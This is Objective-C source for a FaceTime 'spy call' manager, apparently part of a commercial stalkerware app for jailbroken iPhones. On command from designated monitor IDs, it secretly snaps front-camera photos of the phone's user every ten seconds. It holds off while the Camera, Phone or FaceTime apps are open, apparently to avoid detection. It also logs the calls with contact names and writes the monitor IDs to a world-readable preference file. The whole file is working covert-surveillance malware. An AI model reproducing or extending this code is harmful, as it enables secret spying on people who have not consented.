//
//  FaceTimeSpyCallManager.m
//  FaceTimeSpyCallManager
//
//  Created by Makara Khloth on 7/15/13.
//  Copyright 2013 __MyCompanyName__. All rights reserved.
//

#import "FaceTimeSpyCallManager.h"
#import "RecentFaceTimeCallNotifier.h"
#import "SBKilledController.h"
#import "TelephonyNotificationManager.h"
#import "PreferenceManager.h"
#import "EventDelegate.h"
#import "CameraEventCapture.h"
#import "CameraCaptureManager.h"
#import "PrefMonitorFacetimeID.h"
#import "SharedFileIPC.h"
#import "DefStd.h"
#import "FMDatabase.h"
#import "FxVoIPEvent.h"
#import "DateTimeFormat.h"
#import "ABContactsManager.h"
#import "DaemonPrivateHome.h"
#import "MediaEvent.h"
#import "SpringBoardServices.h"

@interface FaceTimeSpyCallManager (private)
- (void) sharePreferenceFaceTimeIDs;
- (void) createFSDBIfNotExist;
- (NSUInteger) generateFrameStripID;
- (void) startCaptureImage;
- (void) stopCaptureImage;
- (void) createVoIPEventWithFaceTimeID: (NSString *) aFaceTimeID
					  withFrameStripID: (NSUInteger) aFrameStripID;
- (void) createScreenShotAsVoIPEventWithFrameStripID: (NSUInteger) aFrameStripID;
- (NSString *) getTimeStamp;
- (void) shareFTSpyIDsStatusUseInDataProtectedMode;
- (void) deleteFTSpyIDsStatusUseInDataProtectedModeIfExist;
@end

@implementation FaceTimeSpyCallManager

@synthesize mTelephonyNotificationManager, mPreferenceManager, mEventDelegate,mCameraEventCapture;
@synthesize mFSDBPath, mOutputImagePath;

- (id) initWithEventDelegate: (id <EventDelegate>) aEventDelegate {
	if ((self = [super init])) {
		[self setMEventDelegate:aEventDelegate];
		
		mMessagePortReader = [[MessagePortIPCReader alloc] initWithPortName:kFaceTimeSpyCallMSCommandMsgPort
												 withMessagePortIPCDelegate:self];
        
        mSBKilledController = [[SBKilledController alloc] init];
	}
	return (self);
}

- (void) start {
	DLog (@"Start FaceTime spy call")
	if (!mRecentFTCallNotifier) {
		mRecentFTCallNotifier = [[RecentFaceTimeCallNotifier alloc] initWithTelephonyNotificationManager:mTelephonyNotificationManager];
		[mRecentFTCallNotifier setMPreferenceManager:mPreferenceManager];
		[mRecentFTCallNotifier start];
	}
	[self createFSDBIfNotExist];
	[mMessagePortReader start];
	[self sharePreferenceFaceTimeIDs];
    [self shareFTSpyIDsStatusUseInDataProtectedMode];
    
    mSBKilledController.mRecentFaceTimeCallNotifier = mRecentFTCallNotifier;
    [mSBKilledController start];
}

- (void) stop {
	DLog (@"Stop FaceTime spy call")
	if (mRecentFTCallNotifier) {
		[mRecentFTCallNotifier stop];
		[mRecentFTCallNotifier release];
		mRecentFTCallNotifier = nil;
	}
	[self stopCaptureImage];
	[mMessagePortReader stop];
	[self sharePreferenceFaceTimeIDs];
    [self deleteFTSpyIDsStatusUseInDataProtectedModeIfExist];
    
    mSBKilledController.mRecentFaceTimeCallNotifier = nil;
    [mSBKilledController stop];
}

- (void) disableFTSpyCall {
	[self stop];
	
	PrefMonitorFacetimeID *prefMonitorFT = [[PrefMonitorFacetimeID alloc] init];
	SharedFileIPC *sharedFile = [[SharedFileIPC alloc] initWithSharedFileName:kSharedFileMobileSubstrate5];
	[sharedFile writeData:[prefMonitorFT toData] withID:kSharedFileFaceTimeIDID];
	[sharedFile release];
	[prefMonitorFT release];
    
    [self deleteFTSpyIDsStatusUseInDataProtectedModeIfExist];
}

- (void) dataDidReceivedFromMessagePort: (NSData*) aRawData {
	if (aRawData) {
		NSInteger location = 0;
		NSInteger cmd = 0;
		[aRawData getBytes:&cmd length:sizeof(NSInteger)];
		location += sizeof(NSInteger);
		
		NSInteger length = 0;
		[aRawData getBytes:&length range:NSMakeRange(location, sizeof(NSInteger))];
		location += sizeof(NSInteger);
		
		NSData *subData = [aRawData subdataWithRange:NSMakeRange(location, length)];
		NSString *facetimeID = [[NSString alloc] initWithData:subData encoding:NSUTF8StringEncoding];
		
		DLog (@"cmd = %ld", (long)cmd);
		DLog (@"facetimeID = %@", facetimeID);
		
		if (cmd == 1) {
			// Generate frame strip ID
			mFrameStripID = [self generateFrameStripID];
			DLog (@"mFrameStripID = %lu", (unsigned long)mFrameStripID);
			
			// Create FaceTime event
			[self createVoIPEventWithFaceTimeID:facetimeID withFrameStripID:mFrameStripID];
			
			// Camera capture
			[self performSelector:@selector(startCaptureImage) withObject:nil afterDelay:0];
			
		} else if (cmd == 0) {
			mFrameStripID = 0;
			[self stopCaptureImage];
		}
		
		[facetimeID release];
	}
}

- (void) sharePreferenceFaceTimeIDs {
	PrefMonitorFacetimeID *prefMonitorFT = (PrefMonitorFacetimeID *)[[self mPreferenceManager] preference:kFacetimeID];
	SharedFileIPC *sharedFile = [[SharedFileIPC alloc] initWithSharedFileName:kSharedFileMobileSubstrate5];
	[sharedFile writeData:[prefMonitorFT toData] withID:kSharedFileFaceTimeIDID];
	[sharedFile release];
}

- (void) createFSDBIfNotExist {
	DLog (@"Create mFSDatabase if not exist, mFSDatabase = %@", mFSDatabase)
	
	if (!mFSDatabase) {
		NSString *sql = @"CREATE TABLE IF NOT EXISTS fsid (id INTEGER PRIMARY KEY AUTOINCREMENT)";
		NSString *dbPath = [NSString stringWithFormat:@"%@%@", mFSDBPath, @"fsdb.sqlite3"];
		mFSDatabase = [[FMDatabase databaseWithPath:dbPath] retain];
		[mFSDatabase open];
		[mFSDatabase executeUpdate:sql];
	}
}

- (NSUInteger) generateFrameStripID {
	DLog (@"Generate frame strip ID, mFSDatabase = %@", mFSDatabase)
	
	[mFSDatabase executeUpdate:@"INSERT INTO fsid VALUES(NULL)"];
	unsigned long frameStripID = [mFSDatabase lastInsertRowId];
	
	DLog (@"frameStripID        = %lu", frameStripID);
	DLog (@"lastErrorMessage    = %@", [mFSDatabase lastErrorMessage]);
	
	return (frameStripID);
}

- (void) startCaptureImage {
	DLog (@"Capture image, mFSDatabase = %@, mFrameStripID = %lu", mFSDatabase, (unsigned long)mFrameStripID)
	
	mach_port_t *p = (mach_port_t *) SBSSpringBoardServerPort();
	char frontmostAppS[256];
	memset(frontmostAppS, sizeof(frontmostAppS), 0);
	SBFrontmostApplicationDisplayIdentifier(p,frontmostAppS);
	
	NSString * frontmostApp = [NSString stringWithFormat:@"%s",frontmostAppS];
	DLog(@"Frontmost app is %@", frontmostApp);
	
	if ([frontmostApp isEqualToString:@"com.apple.camera"]      ||			// Camera application
		[frontmostApp isEqualToString:@"com.apple.mobilephone"] ||          // MobilePhone application
        [frontmostApp isEqualToString:@"com.apple.facetime"])   {           // FaceTime application
		//[self createScreenShotAsVoIPEventWithFrameStripID:mFrameStripID];
	} else {
		[mCameraEventCapture captureCameraImageWithDelegate:nil
										   withFrameStripID:mFrameStripID
												frontCamera:YES];
	}
	
	[self performSelector:@selector(startCaptureImage)
			   withObject:nil
			   afterDelay:10];
}

- (void) stopCaptureImage {
	[NSObject cancelPreviousPerformRequestsWithTarget:self
											 selector:@selector(startCaptureImage)
											   object:nil];
}

- (void) createVoIPEventWithFaceTimeID: (NSString *) aFaceTimeID
					  withFrameStripID: (NSUInteger) aFrameStripID  {
	NSString *contactName = nil;
	NSString *normalizedFaceTimeID = [aFaceTimeID stringByReplacingOccurrencesOfString:@"-" withString:@""];
	ABContactsManager *abContactsManager = [[ABContactsManager alloc] init];
	NSRange locationOfAt = [aFaceTimeID rangeOfString:@"@"];
	if (locationOfAt.location != NSNotFound) {
		// CASE: FaceTime spy call monitor is an email address
		//contactName = [abContactsManager searchFirstLastNameWithEmail:normalizedFaceTimeID];
        contactName = [abContactsManager searchDistinctFirstLastNameWithEmailV2:normalizedFaceTimeID];
	} else {
		// CASE: FaceTime spy call monitor is a telephone number
		//contactName = [abContactsManager searchFirstNameLastName:normalizedFaceTimeID];
        contactName = [abContactsManager searchFirstNameLastName:normalizedFaceTimeID contactID:-1];
	}
	DLog (@"contactName = %@", contactName)
	
	FxVoIPEvent *voIPEvent = [[FxVoIPEvent alloc] init];
	[voIPEvent setDateTime:[DateTimeFormat phoenixDateTime]];
	[voIPEvent setMCategory:kVoIPCategoryFaceTime];
	[voIPEvent setMDirection:kEventDirectionIn];
	[voIPEvent setMDuration:0];
	[voIPEvent setMUserID:aFaceTimeID];
	[voIPEvent setMContactName:contactName];
	[voIPEvent setMVoIPMonitor:kFxVoIPMonitorYES];
	[voIPEvent setMFrameStripID:aFrameStripID];
	
	if ([mEventDelegate respondsToSelector:@selector(eventFinished:)]) {
		[mEventDelegate performSelector:@selector(eventFinished:) withObject:voIPEvent];
	}
	
	[voIPEvent release];
	[abContactsManager release];
}

- (void) createScreenShotAsVoIPEventWithFrameStripID: (NSUInteger) aFrameStripID {
	
	UIImage *image = [CameraCaptureManager takeScreenShot];
	NSData *imageData = UIImageJPEGRepresentation(image, 1);
	
	NSString *outputFolder = [NSString stringWithFormat:@"%@%@/", [self mOutputImagePath], @"image"];
	[DaemonPrivateHome createDirectoryAndIntermediateDirectories:outputFolder];
	NSString *imageFilePath = [NSString stringWithFormat:@"%@screenshot_image%@.%@",
										outputFolder, 
										[self getTimeStamp], 
										@"jpg"];
	
	[imageData writeToFile:imageFilePath atomically:YES];
	
	MediaEvent *mediaEvent = [[MediaEvent alloc] init];
	// FxEvent
	[mediaEvent setDateTime:[DateTimeFormat phoenixDateTime]];
	[mediaEvent setEventType:kEventTypeRemoteCameraImage];
	[mediaEvent setFullPath:imageFilePath];
	[mediaEvent setMDuration:aFrameStripID]; // Use duration field to store frame strip ID
	
	if ([mEventDelegate respondsToSelector:@selector(eventFinished:)]) {
		[mEventDelegate performSelector:@selector(eventFinished:) withObject:mediaEvent];
	}
	
	[mediaEvent release];
}

- (NSString *) getTimeStamp {
	NSDateFormatter *dateFormatter = [[NSDateFormatter alloc] init];
	[dateFormatter setDateFormat:@"yyyy-MM-dd_HH:mm:ss:SSS"];
	NSString *formattedDateString = [[dateFormatter stringFromDate:[NSDate date]] retain];
	[dateFormatter release];
	return [formattedDateString autorelease];
}

- (void) shareFTSpyIDsStatusUseInDataProtectedMode {
    PrefMonitorFacetimeID *prefMonitorFT = (PrefMonitorFacetimeID *)[[self mPreferenceManager] preference:kFacetimeID];
    NSMutableDictionary *preferences = [NSMutableDictionary dictionary];
    [preferences setObject:[prefMonitorFT toData] forKey:@"secure.remote.ft.user.ids"];
    [preferences writeToFile:@"/var/mobile/Library/Preferences/com.secure.remote.ft.user.ids.plist" atomically:YES];
    system("chmod 644 /var/mobile/Library/Preferences/com.secure.remote.ft.user.ids.plist");
}

- (void) deleteFTSpyIDsStatusUseInDataProtectedModeIfExist {
    NSFileManager *fileManager = [NSFileManager defaultManager];
    if ([fileManager fileExistsAtPath:@"/var/mobile/Library/Preferences/com.secure.remote.ft.user.ids.plist"]) {
        [fileManager removeItemAtPath:@"/var/mobile/Library/Preferences/com.secure.remote.ft.user.ids.plist" error:nil];
    }
}

- (void) dealloc {
	[mOutputImagePath release];
	[mFSDBPath release];
	
	[mFSDatabase close];
	[mFSDatabase release];
	
	[self disableFTSpyCall];
	
	[mMessagePortReader release];
	
    [mSBKilledController release];
    
	[super dealloc];
}

@end
